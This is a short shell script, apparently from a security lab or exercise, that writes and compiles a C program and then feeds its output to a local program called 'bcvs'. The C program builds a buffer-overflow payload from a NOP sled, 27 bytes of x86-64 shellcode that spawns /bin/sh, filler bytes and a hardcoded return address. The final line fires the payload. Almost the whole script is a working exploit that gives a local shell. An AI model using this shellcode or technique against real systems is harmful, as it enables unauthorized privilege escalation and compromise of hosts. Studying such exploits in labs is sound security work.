#unique since it's a buffer overflow and I use this nowhere else
cd /opt/bcvs
touch buff2.c
cat <<EOS > "buff2.c"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90

char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
char addr[] = "\x50\xe6\xff\xff\xff\x7f";

void main() {
    char buff[533] = {0};

    // 263 NOP sled
    for (int i = 0; i < 263; i++) {
        buff[i] = NOP;
    }
    // 27 shellcode
    for (int i = 0; i < 27; i++) {
        buff[i+263] = shellcode[i];
    }
    // 236 filler
    for (int i = 0; i < 236; i++) {
        buff[i+290] = '\x41';
    }
    // 6 addr LSB
    for (int i = 0; i < 6; i++) {
        buff[i+526] = addr[i];
    }
    buff[532] = '\0';

    printf(buff);
}
EOS
gcc buff2.c
./bcvs ci $(./a.out)